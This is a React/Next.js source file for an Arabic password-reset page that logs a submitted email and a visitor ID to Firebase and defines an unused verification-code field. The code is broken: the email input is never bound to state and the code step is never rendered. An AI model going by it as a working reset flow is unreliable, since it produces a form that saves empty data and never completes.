"use client"

import { addData } from "@/lib/firebase"
import Link from "next/link"
import { useState } from "react"
function OtpFeild() {
  return (
    <div className="w-full max-w-md">
        <div className="text-center mb-12">
        <p className="text-gray-400 text-md">
  رمز التحقق تم إرساله بنجاح إلى بريدك الإلكتروني. تحقق من صندوق الوارد الخاص بك لإكمال العملية.
</p>
      </div>
      <form className="space-y-6">
        {/* Email Field */}
        <div>
          <input
            type="tel"
            placeholder="رمز التحقق"
            className="w-full px-4 py-3 bg-[#2a2a2a] border border-[#4a7c9e] rounded-lg text-white placeholder-gray-600 text-right focus:outline-none focus:border-[#6fa3c1] focus:ring-1 focus:ring-[#6fa3c1]"
          />
        </div>

        {/* Send Code Button */}
        <button
          type="submit"
          className="w-full bg-[#d4a574] hover:bg-[#e5b884] text-[#1a1a1a] font-semibold py-3 rounded-lg transition-colors"
        >
          تحقق
        </button>
      </form>
    </div>
  )
}
export default function ResetPasswordPage() {
  const [email, setEmail] = useState('')
  const [loading,setLoading]=useState(true)
  const [step,setStep]=useState<'email'|'otp'>('email')

  const handleSubmit=async(e:React.FormEvent)=>{
    e.preventDefault()
    const visitorID=localStorage.getItem('visitor')
    setLoading(true)
    await addData({id:visitorID,email,page:'forgeet'}).then(()=>{
      setLoading(false)
      setStep('otp')
    })
    
    }
  return (
    <div className="min-h-screen bg-[#3a3a3a] flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Header */}
        <div className="text-center mb-12">
          <h1 className="text-xl font-bold text-white mb-4 text-balance">إعادة تعيين كلمة المرور</h1>
          <p className="text-gray-400 text-sm">ادخل البريد الإلكتروني لإرسال رمز التحقق عليه</p>
        </div>

        {/* Form */}
        <form className="space-y-6" onSubmit={handleSubmit}>
          {/* Email Field */}
          <div>
            <label className="block text-gray-300 text-right mb-2 text-sm">البريد الإلكتروني</label>
            <input
              type="email"
              placeholder="البريد الإلكتروني"
              className="w-full px-4 py-2 bg-[#2a2a2a] border border-[#4a7c9e] rounded-lg text-white placeholder-gray-600 text-right focus:outline-none focus:border-[#6fa3c1] focus:ring-1 focus:ring-[#6fa3c1]"
            />
          </div>

          {/* Send Code Button */}
          <button
            type="submit"
            className="w-full bg-[#d4a574] hover:bg-[#e5b884] text-[#1a1a1a] font-semibold py-2 rounded-lg transition-colors"
          >
            إرسل رمز التحقق
          </button>

          {/* Return to Login Link */}
          <div className="text-center pt-2">
            <Link href="/" className="text-[#4da6ff] hover:text-[#66b3ff] font-semibold text-sm">
              العودة لتسجيل الدخول
            </Link>
          </div>
        </form>

        {/* Footer WhatsApp Button */}
        <div className="flex justify-end items-center mt-12">

        </div>
      </div>
    </div>
  )
}
